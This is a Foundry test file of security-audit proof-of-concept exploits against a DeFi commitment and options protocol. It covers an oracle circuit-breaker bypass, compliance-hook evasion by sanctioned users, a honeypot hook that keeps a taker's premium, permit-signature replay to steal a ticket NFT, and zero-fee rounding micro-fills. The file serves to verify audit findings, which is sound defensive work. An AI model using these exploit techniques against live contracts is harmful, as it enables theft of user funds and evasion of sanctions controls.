// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {LiquidityVault} from "../src/LiquidityVault.sol";
import {ExecutionTicket} from "../src/ExecutionTicket.sol";
import {CommitmentManager} from "../src/CommitmentManager.sol";
import {ExecutionRouter} from "../src/ExecutionRouter.sol";
import {SignedPullOracle} from "../src/adapters/SignedPullOracle.sol";
import {OraclePriceAdapter} from "../src/adapters/OraclePriceAdapter.sol";
import {HSPComplianceHook} from "../src/adapters/HSPComplianceHook.sol";
import {
    CreateOfferParams,
    PriceMode,
    TicketStatus,
    IComplianceHook,
    IPriceOracle
} from "../src/interfaces/IProtocol.sol";

contract AuditMockERC20 is ERC20 {
    uint8 private immutable _dec;

    constructor(string memory n, string memory s, uint8 dec_) ERC20(n, s) {
        _dec = dec_;
    }

    function decimals() public view override returns (uint8) {
        return _dec;
    }

    function mint(address to, uint256 amt) external {
        _mint(to, amt);
    }
}

contract AuditMockWHSK is ERC20 {
    constructor() ERC20("Wrapped HSK", "WHSK") {}

    function deposit() external payable {
        _mint(msg.sender, msg.value);
    }

    function withdraw(uint256 wad) external {
        _burn(msg.sender, wad);
        (bool ok,) = msg.sender.call{value: wad}("");
        require(ok, "eth transfer failed");
    }

    function mint(address to, uint256 amt) external {
        _mint(to, amt);
    }
}

contract AuditMockOracle is IPriceOracle {
    uint256 public priceX36;
    uint256 public updatedAt;
    bool public isValid;

    constructor(uint256 _priceX36, uint256 _updatedAt, bool _isValid) {
        priceX36 = _priceX36;
        updatedAt = _updatedAt;
        isValid = _isValid;
    }

    function set(uint256 _priceX36, uint256 _updatedAt, bool _isValid) external {
        priceX36 = _priceX36;
        updatedAt = _updatedAt;
        isValid = _isValid;
    }

    function getPriceX36(address, address) external view override returns (PriceQuote memory) {
        return PriceQuote({priceX36: priceX36, updatedAt: updatedAt, isValid: isValid});
    }
}

contract HoneypotComplianceHook is IComplianceHook {
    address public immutable owner;
    bool public locked;

    constructor() {
        owner = msg.sender;
    }

    function setLocked(bool _locked) external {
        require(msg.sender == owner, "not owner");
        locked = _locked;
    }

    function beforeCreateOffer(address, address, address) external view override {}

    function beforeReserve(uint64, address, address, uint256) external view override {}

    function beforeTransfer(uint256, address, address) external view override {
        require(!locked, "honeypot: transfer locked");
    }

    function beforeExercise(uint256, address, address) external view override {
        require(!locked, "honeypot: exercise locked");
    }
}

/// @title SecurityAuditPoCTest
/// @notice Independent Phase 1 Workstream A audit PoCs verifying confirmed findings against frozen contracts.
contract SecurityAuditPoCTest is Test {
    uint256 internal constant ORACLE_PK = 0xA11CE;
    uint256 internal constant TRADER1_PK = 0xB0B1;
    uint256 internal constant WHSK_PRICE_X36 = 8e22; // 1e18 WHSK = 80_000 raw USDT (0.08 USDT)

    address internal admin;
    address internal guardian = makeAddr("guardian");
    address internal feeCollector = makeAddr("feeCollector");
    address internal lp = makeAddr("lp");
    address internal trader1;
    address internal trader2 = makeAddr("trader2");
    address internal attacker = makeAddr("attacker");

    AuditMockWHSK internal whsk;
    AuditMockERC20 internal usdt;
    LiquidityVault internal vault;
    CommitmentManager internal manager;
    ExecutionTicket internal ticketNft;
    ExecutionRouter internal router;
    SignedPullOracle internal pullOracle;
    AuditMockOracle internal secondaryOracle;
    OraclePriceAdapter internal oracleAdapter;
    HSPComplianceHook internal hspHook;

    function setUp() public {
        vm.warp(1_795_500_000);
        admin = address(this);
        trader1 = vm.addr(TRADER1_PK);

        whsk = new AuditMockWHSK();
        usdt = new AuditMockERC20("Tether USD", "USDT", 6);

        vault = new LiquidityVault(guardian, feeCollector);
        manager = new CommitmentManager(address(vault), guardian, 50, 100e18); // 50 bps fee, 100 WHSK min
        ticketNft = new ExecutionTicket(address(manager));
        vault.setManager(address(manager));
        manager.setTicketNft(address(ticketNft));

        router = new ExecutionRouter(address(manager), address(whsk));
        pullOracle = new SignedPullOracle(vm.addr(ORACLE_PK));
        secondaryOracle = new AuditMockOracle(WHSK_PRICE_X36, block.timestamp, true);
        oracleAdapter = new OraclePriceAdapter();
        hspHook = new HSPComplianceHook(vm.addr(ORACLE_PK));

        oracleAdapter.setPairConfig(
            address(whsk),
            address(usdt),
            OraclePriceAdapter.PairConfig({
                primaryFeed: address(pullOracle),
                secondaryFeed: address(secondaryOracle),
                maxStaleness: 30,
                maxDeviationBps: 500, // 5% circuit breaker
                allowSecondaryFallback: false,
                hardMinPriceX36: 1e21,
                hardMaxPriceX36: 1e25
            })
        );

        _signAndUpdatePullOracle(WHSK_PRICE_X36, block.timestamp);

        whsk.mint(lp, 1_000_000e18);
        vm.deal(address(whsk), 1_000_000 ether);
        usdt.mint(trader1, 1_000_000e6);
        usdt.mint(trader2, 1_000_000e6);
        usdt.mint(attacker, 1_000_000e6);
        vm.deal(trader1, 1_000 ether);

        vm.prank(lp);
        whsk.approve(address(vault), type(uint256).max);
        vm.prank(trader1);
        usdt.approve(address(vault), type(uint256).max);
        vm.prank(trader2);
        usdt.approve(address(vault), type(uint256).max);
        vm.prank(attacker);
        usdt.approve(address(vault), type(uint256).max);
    }

    function _signAndUpdatePullOracle(uint256 priceX36, uint256 reportTs) internal {
        bytes32 structHash = keccak256(
            abi.encode(pullOracle.PRICE_REPORT_TYPEHASH(), address(whsk), address(usdt), priceX36, reportTs)
        );
        bytes32 domainSeparator = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256("ProtocolSignedPullOracle"),
                keccak256("1"),
                block.chainid,
                address(pullOracle)
            )
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ORACLE_PK, digest);
        pullOracle.updatePrice(address(whsk), address(usdt), priceX36, reportTs, abi.encodePacked(r, s, v));
    }

    function _createOffer(
        PriceMode mode,
        uint256 amount,
        uint256 fixedPrice,
        address oracle,
        address hook
    ) internal returns (uint64 offerId) {
        vm.startPrank(lp);
        vault.deposit(address(whsk), amount);
        offerId = manager.createOffer(
            CreateOfferParams({
                inventoryToken: address(whsk),
                paymentToken: address(usdt),
                initialAmount: amount,
                minFillAmount: 100e18,
                expiry: uint40(block.timestamp + 7 days),
                minDuration: 60,
                maxDuration: 3 days,
                basePremiumBps: 100,
                dailyPremiumBps: 10,
                priceMode: mode,
                spreadBps: 0,
                oracle: oracle,
                complianceHook: hook,
                fixedPriceX36: fixedPrice,
                minPriceX36: 0,
                maxPriceX36: 0
            })
        );
        vm.stopPrank();
    }

    /// @notice [HIGH-1] OraclePriceAdapter silently bypasses maxDeviationBps circuit breaker whenever secondary feed is unhealthy.
    function test_PoC_H1_OracleAdapterBypassesDeviationBreakerWhenSecondaryUnhealthy() public {
        uint64 offerId = _createOffer(PriceMode.FLOATING, 1_000e18, 0, address(oracleAdapter), address(0));

        // 1. Both feeds healthy at $0.08: trader1 reserves 500 WHSK.
        vm.prank(trader1);
        uint256 ticketId = manager.reserve(offerId, 500e18, 1 days, type(uint256).max, trader1);

        // 2. Time advances 31s: secondary feed (e.g. slower 60s push feed) is now 31s old (> maxStaleness=30).
        //    Meanwhile primary SignedPullOracle reports a 50x manipulated/erroneous price (400e22 = $4.00, within hardMax=1e25).
        vm.warp(block.timestamp + 31);
        _signAndUpdatePullOracle(WHSK_PRICE_X36 * 50, block.timestamp);

        // Even though secondary is still sitting at $0.08 (5000% deviation vs maxDeviationBps=500),
        // secondary fails maxStaleness -> sOk = false -> OraclePriceAdapter hits `if (pOk && !sOk) return p;`
        // and silently disables the circuit breaker!
        IPriceOracle.PriceQuote memory q = oracleAdapter.getPriceX36(address(whsk), address(usdt));
        assertTrue(q.isValid, "Circuit breaker bypassed when secondary stale");
        assertEq(q.priceX36, WHSK_PRICE_X36 * 50, "Unchecked 50x primary price accepted");

        // Same bypass if secondary feed is invalidated or pushed outside hardMin/hardMax:
        secondaryOracle.set(1, block.timestamp, true); // below hardMinPriceX36=1e21 -> sOk=false
        IPriceOracle.PriceQuote memory q2 = oracleAdapter.getPriceX36(address(whsk), address(usdt));
        assertTrue(q2.isValid, "Circuit breaker bypassed when secondary violates hardMin");

        // Exercise succeeds at the unchecked 50x price (or conversely a 90% crash within hardMin):
        vm.prank(trader1);
        (, uint256 grossPay) = manager.exercise(ticketId, 500e18, type(uint256).max, trader1);
        assertEq(grossPay, 500 * 4e6, "Settled at 50x unchecked price");
    }

    /// @notice [HIGH-2] ExecutionRouter breaks HSPComplianceHook: DoS if router not allowlisted; full compliance bypass if allowlisted.
    function test_PoC_H2_ExecutionRouterBreaksHSPComplianceHook() public {
        // Setup WHSK/USDT offer with WHSK as inventory (so unwrapInventoryToNative can be used).
        hspHook.setApproved(lp, block.timestamp + 30 days);
        hspHook.setApproved(trader1, block.timestamp + 30 days);

        uint64 offerId = _createOffer(PriceMode.FIXED, 1_000e18, WHSK_PRICE_X36, address(0), address(hspHook));

        vm.prank(trader1);
        uint256 ticketId = manager.reserve(offerId, 500e18, 1 days, type(uint256).max, trader1);

        vm.startPrank(trader1);
        ticketNft.setApprovalForAll(address(router), true);
        usdt.approve(address(router), type(uint256).max);

        ExecutionRouter.ExerciseLeg[] memory legs = new ExecutionRouter.ExerciseLeg[](1);
        legs[0] = ExecutionRouter.ExerciseLeg({ticketId: ticketId, fillAmount: 100e18, maxLegPaymentIn: type(uint256).max});

        ExecutionRouter.BatchExerciseParams memory params = ExecutionRouter.BatchExerciseParams({
            inventoryToken: address(whsk),
            paymentToken: address(usdt),
            minTotalInventoryOut: 100e18,
            maxTotalPaymentIn: 10e6,
            deadline: block.timestamp + 1 hours,
            receiver: trader1,
            unwrapInventoryToNative: false,
            legs: legs
        });

        // Case A: Compliant trader1 CANNOT use ExecutionRouter because CommitmentManager checks isCompliant(router).
        vm.expectRevert(abi.encodeWithSelector(HSPComplianceHook.NotCompliant.selector, address(router)));
        router.batchExercise(params);
        vm.stopPrank();

        // Case B: Admin allowlists ExecutionRouter so batching works.
        hspHook.setApproved(address(router), block.timestamp + 30 days);

        // Now trader1 is REVOKED (sanctioned) and `sanctionedReceiver` is never KYC'd.
        hspHook.revoke(trader1);
        address sanctionedReceiver = makeAddr("sanctionedReceiver");
        assertFalse(hspHook.isCompliant(trader1));
        assertFalse(hspHook.isCompliant(sanctionedReceiver));

        // Direct exercise by trader1 reverts as intended:
        vm.prank(trader1);
        vm.expectRevert(abi.encodeWithSelector(HSPComplianceHook.NotCompliant.selector, trader1));
        manager.exercise(ticketId, 100e18, type(uint256).max, sanctionedReceiver);

        // Yet trader1 bypasses HSPComplianceHook completely via ExecutionRouter with unwrapInventoryToNative=true,
        // sending unwrapped native HSK directly to sanctionedReceiver!
        params.receiver = sanctionedReceiver;
        params.unwrapInventoryToNative = true;
        uint256 ethBefore = sanctionedReceiver.balance;
        vm.prank(trader1);
        router.batchExercise(params);
        assertEq(sanctionedReceiver.balance - ethBefore, 100e18, "Sanctioned user & receiver bypassed compliance");
    }

    /// @notice [HIGH-3] CommitmentManager.splitTicket checks beforeTransfer on msg.sender instead of ownerOf(ticketId).
    function test_PoC_H3_SplitTicketBypassesComplianceCheckOnSanctionedOwner() public {
        hspHook.setApproved(lp, block.timestamp + 30 days);
        hspHook.setApproved(trader1, block.timestamp + 30 days);
        hspHook.setApproved(trader2, block.timestamp + 30 days);

        uint64 offerId = _createOffer(PriceMode.FIXED, 1_000e18, WHSK_PRICE_X36, address(0), address(hspHook));

        vm.prank(trader1);
        uint256 ticketId = manager.reserve(offerId, 1_000e18, 1 days, type(uint256).max, trader1);

        // trader1 approves compliant trader2 prior to being sanctioned.
        vm.prank(trader1);
        ticketNft.approve(trader2, ticketId);

        // Admin revokes trader1.
        hspHook.revoke(trader1);

        // trader1 cannot transfer or exercise directly:
        vm.prank(trader2);
        vm.expectRevert(abi.encodeWithSelector(HSPComplianceHook.NotCompliant.selector, trader1));
        ticketNft.transferFrom(trader1, trader2, ticketId);

        // However, trader2 calls splitTicket -> CommitmentManager calls beforeTransfer(ticketId, trader2, trader2)
        // instead of beforeTransfer(ticketId, trader1, trader2), extracting 900 WHSK out of sanctioned trader1!
        vm.prank(trader2);
        uint256 newTicketId = manager.splitTicket(ticketId, 900e18, trader2);
        assertEq(ticketNft.ownerOf(newTicketId), trader2);
        assertEq(manager.getTicket(newTicketId).remainingAmount, 900e18);
    }

    /// @notice [MEDIUM-1] Malicious LP sets a stateful honeypot complianceHook in createOffer to steal taker premium.
    function test_PoC_M1_MaliciousLPHoneypotHookRugsTakerPremium() public {
        vm.startPrank(lp);
        HoneypotComplianceHook honeypot = new HoneypotComplianceHook();
        vault.deposit(address(whsk), 1_000e18);
        uint64 offerId = manager.createOffer(
            CreateOfferParams({
                inventoryToken: address(whsk),
                paymentToken: address(usdt),
                initialAmount: 1_000e18,
                minFillAmount: 100e18,
                expiry: uint40(block.timestamp + 7 days),
                minDuration: 60,
                maxDuration: 3 days,
                basePremiumBps: 1_000, // 10% upfront premium
                dailyPremiumBps: 0,
                priceMode: PriceMode.FIXED,
                spreadBps: 0,
                oracle: address(0),
                complianceHook: address(honeypot),
                fixedPriceX36: WHSK_PRICE_X36,
                minPriceX36: 0,
                maxPriceX36: 0
            })
        );
        vm.stopPrank();

        // Taker reserves 1,000 WHSK ($80 notional) and pays $8.00 USDT premium.
        uint256 takerUsdtBefore = usdt.balanceOf(trader1);
        vm.prank(trader1);
        uint256 ticketId = manager.reserve(offerId, 1_000e18, 1 days, type(uint256).max, trader1);
        uint256 paidPremium = takerUsdtBefore - usdt.balanceOf(trader1);
        assertGt(paidPremium, 0);

        // LP immediately claims the stolen premium and locks exercise/transfer on the honeypot hook.
        vm.startPrank(lp);
        vault.claimProceeds(address(usdt), 0, lp);
        honeypot.setLocked(true);
        vm.stopPrank();

        // Taker is permanently blocked from exercising or transferring the ticket.
        vm.prank(trader1);
        vm.expectRevert("honeypot: exercise locked");
        manager.exercise(ticketId, 1_000e18, type(uint256).max, trader1);

        // After expiry, LP reclaims 100% of inventory while keeping the taker's premium.
        vm.warp(block.timestamp + 1 days + 1);
        manager.reclaimExpired(ticketId);
        assertEq(vault.offerBalance(offerId), 1_000e18);
    }

    /// @notice [MEDIUM-2] ExecutionTicket.permit nonces are not incremented on transfer, allowing replay upon reacquisition.
    function test_PoC_M2_ExecutionTicketPermitReplayAfterTransferCycle() public {
        uint64 offerId = _createOffer(PriceMode.FIXED, 1_000e18, WHSK_PRICE_X36, address(0), address(0));
        vm.prank(trader1);
        uint256 ticketId = manager.reserve(offerId, 500e18, 1 days, type(uint256).max, trader1);

        uint256 deadline = block.timestamp + 12 hours;
        bytes32 permitTypehash = keccak256("Permit(address spender,uint256 tokenId,uint256 nonce,uint256 deadline)");
        bytes32 structHash = keccak256(abi.encode(permitTypehash, attacker, ticketId, 0, deadline));
        bytes32 domainSeparator = keccak256(
            abi.encode(
                keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
                keccak256("Execution Ticket"),
                keccak256("1"),
                block.chainid,
                address(ticketNft)
            )
        );
        bytes32 digest = keccak256(abi.encodePacked("\x19\x01", domainSeparator, structHash));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(TRADER1_PK, digest);

        // trader1 never submits the permit, transfers ticket to trader2, and later receives it back.
        vm.prank(trader1);
        ticketNft.transferFrom(trader1, trader2, ticketId);
        vm.prank(trader2);
        ticketNft.transferFrom(trader2, trader1, ticketId);

        assertEq(ticketNft.nonces(ticketId), 0, "Nonce was not invalidated on transfer");

        // Attacker replays the old unused permit signature and steals the ticket!
        vm.startPrank(attacker);
        ticketNft.permit(attacker, ticketId, deadline, v, r, s);
        ticketNft.transferFrom(trader1, attacker, ticketId);
        vm.stopPrank();

        assertEq(ticketNft.ownerOf(ticketId), attacker);
    }

    /// @notice [MEDIUM-3] Retroactive admin fee hike and minTicketAmount raise alter economics & split rights of active tickets.
    function test_PoC_M3_RetroactiveAdminFeeHikeAndMinTicketLockout() public {
        uint64 offerId = _createOffer(PriceMode.FIXED, 1_000e18, WHSK_PRICE_X36, address(0), address(0));
        vm.prank(trader1);
        uint256 ticketId = manager.reserve(offerId, 1_000e18, 1 days, type(uint256).max, trader1);

        uint256 lpProceedsBefore = vault.lpPendingProceeds(lp, address(usdt));

        // Admin raises protocolFeeBps from 50 (0.5%) to 500 (5.0%) and minTicketAmount from 100e18 to 600e18.
        manager.setProtocolFeeBps(500);
        manager.setMinTicketAmount(600e18);

        // Existing ticket holder can no longer split a 1000 WHSK ticket in half (500 < 600)!
        vm.prank(trader1);
        vm.expectRevert(CommitmentManager.InvalidSplitAmount.selector);
        manager.splitTicket(ticketId, 500e18, trader2);

        // When trader1 exercises, LP retroactively pays 5% fee instead of the 0.5% active when the offer/ticket was created!
        vm.prank(trader1);
        (, uint256 grossPay) = manager.exercise(ticketId, 1_000e18, type(uint256).max, trader1);
        uint256 lpEarnedFromExercise = vault.lpPendingProceeds(lp, address(usdt)) - lpProceedsBefore;
        assertEq(lpEarnedFromExercise, (grossPay * 9500) / 10000, "LP lost 5% retroactively");
    }

    /// @notice [MEDIUM-4] exercise() lacks minFillAmount / minTicketAmount guards, allowing 1-wei dust & zero-fee micro-fills.
    function test_PoC_M4_MicroFillZeroProtocolFeeAndDustRemainder() public {
        uint64 offerId = _createOffer(PriceMode.FIXED, 1_000e18, WHSK_PRICE_X36, address(0), address(0));
        vm.prank(trader1);
        uint256 ticketId = manager.reserve(offerId, 500e18, 1 days, type(uint256).max, trader1);

        uint256 feesBefore = vault.protocolFees(address(usdt));

        // 1. Micro-fills with grossPayment = 199 raw units (at 50 bps: floor(199 * 50 / 10000) == 0 fee!)
        //    Fill 2.4875e18 WHSK per call -> 199_000 * 1e18 / 8e22? Wait:
        //    1e18 WHSK = 80_000 raw USDT -> 1e15 WHSK = 80 raw USDT -> 2_487_500_000_000_000 wei = 199 raw USDT.
        uint256 microFill = 2_487_500_000_000_000;
        vm.startPrank(trader1);
        for (uint256 i = 0; i < 10; ++i) {
            (, uint256 paid) = manager.exercise(ticketId, microFill, type(uint256).max, trader1);
            assertEq(paid, 199);
        }
        assertEq(vault.protocolFees(address(usdt)) - feesBefore, 0, "Zero protocol fee paid across 10 fills");

        // 2. Partial fill leaving 1 wei dust (< minTicketAmount = 100e18)
        uint256 rem = manager.getTicket(ticketId).remainingAmount;
        manager.exercise(ticketId, rem - 1, type(uint256).max, trader1);
        vm.stopPrank();

        assertEq(manager.getTicket(ticketId).remainingAmount, 1, "Left 1 wei dust below minTicketAmount");
        assertEq(uint256(manager.getTicket(ticketId).status), uint256(TicketStatus.ACTIVE));
    }

    /// @notice [MEDIUM-5] CommitmentManager has no setGuardian, so a compromised guardian cannot be revoked.
    function test_PoC_M5_UnrotatableCommitmentManagerGuardianPermanentPause() public {
        address newGuardian = makeAddr("newGuardian");
        // Vault allows rotating guardian:
        vault.setGuardian(newGuardian);
        assertEq(vault.guardian(), newGuardian);

        // CommitmentManager has NO setGuardian(), so compromised `guardian` retains permanent pause power:
        vm.prank(guardian);
        manager.setNewReservationsPaused(true);
        assertTrue(manager.newReservationsPaused());

        // Even if admin unpauses, old guardian can immediately re-pause forever:
        manager.setNewReservationsPaused(false);
        vm.prank(guardian);
        manager.setNewReservationsPaused(true);
        assertTrue(manager.newReservationsPaused());
    }

    /// @notice [LOW-1] reclaimExpiredBatch reverts atomically if a single ticket was already reclaimed or not expired.
    function test_PoC_L1_ReclaimExpiredBatchAtomicDoSGrief() public {
        uint64 offerId = _createOffer(PriceMode.FIXED, 1_000e18, WHSK_PRICE_X36, address(0), address(0));
        vm.startPrank(trader1);
        uint256 t1 = manager.reserve(offerId, 200e18, 60, type(uint256).max, trader1);
        uint256 t2 = manager.reserve(offerId, 200e18, 60, type(uint256).max, trader1);
        vm.stopPrank();

        vm.warp(block.timestamp + 61);

        // Front-runner reclaims t1 individually:
        manager.reclaimExpired(t1);

        // LP/keeper batch reclaim for [t1, t2] reverts entirely!
        uint256[] memory ids = new uint256[](2);
        ids[0] = t1;
        ids[1] = t2;
        vm.expectRevert(CommitmentManager.TicketNotActive.selector);
        manager.reclaimExpiredBatch(ids);
    }

    /// @notice [LOW-2] reserve() allows ticket expiry to exceed offer.expiry by up to maxDuration.
    function test_PoC_L2_TicketExpiryExceedsOfferExpiry() public {
        vm.startPrank(lp);
        vault.deposit(address(whsk), 500e18);
        uint40 offerExpiry = uint40(block.timestamp + 1 hours);
        uint64 offerId = manager.createOffer(
            CreateOfferParams({
                inventoryToken: address(whsk),
                paymentToken: address(usdt),
                initialAmount: 500e18,
                minFillAmount: 100e18,
                expiry: offerExpiry,
                minDuration: 60,
                maxDuration: 30 days,
                basePremiumBps: 100,
                dailyPremiumBps: 10,
                priceMode: PriceMode.FIXED,
                spreadBps: 0,
                oracle: address(0),
                complianceHook: address(0),
                fixedPriceX36: WHSK_PRICE_X36,
                minPriceX36: 0,
                maxPriceX36: 0
            })
        );
        vm.stopPrank();

        // 1 second before offerExpiry, taker reserves for 30 days:
        vm.warp(offerExpiry - 1);
        vm.prank(trader1);
        uint256 ticketId = manager.reserve(offerId, 500e18, 30 days, type(uint256).max, trader1);

        assertGt(manager.getTicket(ticketId).expiresAt, offerExpiry + 29 days);
        // LP cannot reclaim after offerExpiry until 30 days later:
        vm.warp(offerExpiry + 1 days);
        vm.expectRevert(CommitmentManager.TicketNotExpired.selector);
        manager.reclaimExpired(ticketId);
    }
}
